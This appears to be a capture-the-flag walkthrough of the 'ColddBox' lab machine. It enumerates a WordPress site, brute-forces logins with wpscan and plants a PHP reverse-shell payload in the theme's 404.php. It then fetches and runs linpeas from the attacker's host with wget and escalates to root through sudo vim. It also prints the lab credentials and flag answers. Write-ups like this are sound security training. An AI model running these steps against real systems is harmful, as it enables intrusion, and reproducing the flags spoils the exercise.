# Information

Name: ColddBox

Difficulty: Easy

Description: An easy level machine with multiple ways to escalate privileges.

## Network enumeration

**Search for open ports using nmap.**

![image](https://user-images.githubusercontent.com/43668197/133641274-56d8287e-6f46-4686-8f6c-efdf5585b593.png)

We have a simple single attack vector machine with the only port open being 80 and we already know its running WordPress and we even have the version 4.1.31.

## Web enumeration

The site is a very basic wordpress page.

![image](https://user-images.githubusercontent.com/43668197/133642232-a7518fa7-3116-4ff6-8d93-9be9f5c3a70f.png)

gobuster finds an unusual hidden directory. Which gives us some possible user names.

![image](https://user-images.githubusercontent.com/43668197/133645634-1a93c872-9fdc-4ee9-bbbb-8c99e67b96c2.png)

![image](https://user-images.githubusercontent.com/43668197/133645694-cf1cd480-b55a-478b-b6c1-2648edcf5adc.png)

The wordpress login page is at the usual place of http://10.10.13.205/wp-login.php. I attempted to use default credentials, no luck getting in there
but it does give us the information that the username was incorrect. Trying out the name hugo we discovered earlier does tell us this user exist so we might
be able to brute it with hydra.

![image](https://user-images.githubusercontent.com/43668197/133646388-1a86fb4d-d4be-4331-a15c-dc41867e4844.png)

First I use wpscan to see if theres any obvious exploits and then I use it to further enumerate the users with the command 
wpscan --url http://10.10.13.205/ --enumerate u  

![image](https://user-images.githubusercontent.com/43668197/133654198-94e2406f-d743-4779-9add-acbd0dca7b89.png)

I add these users to a .txt file and attempt to brute force them with wpscan.

![image](https://user-images.githubusercontent.com/43668197/133656477-711d6ddf-d7de-4445-8cc6-ecb3c29db3d5.png)

We get a username:password combo to log in wordpress with. After logging in I navigated to appearance -> editor -> 404.php and added my php payload to the start.

![image](https://user-images.githubusercontent.com/43668197/133656890-b51678f1-cc55-442f-b565-5d80a2937e55.png)

Then we start up nc listener and head over to http://10.10.13.205/?p=404.php.

![image](https://user-images.githubusercontent.com/43668197/133657182-c0cb3af3-6f21-428d-97b3-d50b83f96561.png)

## Initial access - www-data

Theres one user in the home directory and that is c0ldd. We do not yet have permission to access the user.txt file located there. Its time to move linpeas in and
scan the system.

On my machine:

```
python3 -m http.server
```

On the colddbox machine:

```
cd /tmp
wget http://10.2.70.199:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![image](https://user-images.githubusercontent.com/43668197/133661545-de3b831c-c392-4817-8c5e-460a7a7e2798.png)

Weve now got log in credentials c0ldd:cybersecurity and can access ssh on port 4512.

## Privilege escalation

![image](https://user-images.githubusercontent.com/43668197/133662122-1183912b-acc6-4643-9369-17ec4d1ef967.png)

We can get the user flag now.

**user.txt**

RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==

Sudo -l reveals a few sudo options for this user.

![image](https://user-images.githubusercontent.com/43668197/133662797-f23cc0f3-8f18-4b9f-a9cf-02c4bc2ea6e8.png)

I take the first option and pick vim, https://gtfobins.github.io/gtfobins/vim/#sudo

![image](https://user-images.githubusercontent.com/43668197/133662960-e4d83dc8-0739-4f6c-938e-9e304dbd1129.png)

The root flag is located at /root

**root.txt**

wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
